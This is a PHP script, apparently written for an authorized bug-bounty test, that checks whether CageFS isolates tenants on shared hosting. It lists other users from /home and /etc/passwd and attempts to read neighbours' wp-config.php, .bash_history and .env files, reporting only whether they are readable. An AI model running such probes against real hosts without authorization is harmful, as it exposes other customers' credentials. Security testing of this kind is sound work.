<?php
// bugbounty CageFS cross-tenant boundary probe (authorized test, own account).
// Hard-coded benign READS only; reports READABILITY/structure, never dumps another tenant's secrets.
header('Content-Type: text/plain');
function u(){ return function_exists('posix_geteuid')&&function_exists('posix_getpwuid') ? @posix_getpwuid(posix_geteuid())['name'] : 'uid'.getmyuid(); }
$me=u();
echo "== bugbounty CageFS boundary probe ==\n";
echo "euid_user=$me  uid=".getmyuid()."  cwd=".getcwd()."\n";
echo "open_basedir=".var_export(ini_get('open_basedir'),true)."\n";
echo "disable_functions=".ini_get('disable_functions')."\n\n";

echo "-- scandir('/home') (do I see OTHER tenants' homes?) --\n";
$h=@scandir('/home');
if($h===false){ echo "DENIED\n"; }
else { $others=array_values(array_filter($h, fn($x)=>$x!=='.'&&$x!=='..'&&$x!==$me));
       echo "entries=".count($h)."  non-mine=".count($others)."  sample=".implode(',', array_slice($others,0,15))."\n"; }

echo "\n-- /etc/passwd (virtualized by CageFS? count real u-users) --\n";
$p=@file('/etc/passwd');
if($p===false){ echo "DENIED\n"; }
else { $us=array_map(fn($l)=>explode(':',$l)[0], $p);
       $uu=array_values(array_filter($us, fn($x)=>preg_match('/^u\d{6,}$/',$x)));
       echo "lines=".count($p)."  u-users=".count($uu)."  sample=".implode(',', array_slice($uu,0,15))."\n"; }

echo "\n-- try reading a NEIGHBOR's files (cross-tenant proof, readability only) --\n";
$targets=array();
if(is_array($h)) foreach($h as $x){ if(preg_match('/^u\d{6,}$/',$x) && $x!==$me){ $targets[]=$x; if(count($targets)>=3) break; } }
if(!$targets){ echo "(no other homes visible to enumerate)\n"; }
foreach($targets as $t){
  $dir="/home/$t";
  $ls=@scandir("$dir/public_html");
  echo "/home/$t/public_html scandir: ".($ls===false?"DENIED":("OK items=".count($ls)." ".implode(',',array_slice(array_filter($ls,fn($x)=>$x!=='.'&&$x!=='..'),0,8))))."\n";
  foreach(array("$dir/public_html/wp-config.php","$dir/.bash_history","$dir/public_html/.env") as $f){
    $r=@file_get_contents($f,false,null,0,16);
    echo "   read $f : ".($r===false?"NO":"*** YES, ".strlen($r)." bytes readable (NOT dumping contents) ***")."\n";
  }
}

echo "\n-- shared dirs --\n";
foreach(array('/tmp','/var/tmp','/dev/shm') as $d){ $s=@scandir($d); echo "$d : ".($s===false?"DENIED":("count=".count($s)))."\n"; }
echo "/proc/self/status: ".(@file_get_contents('/proc/self/status')?"readable":"denied")."\n";
echo "== end ==\n";
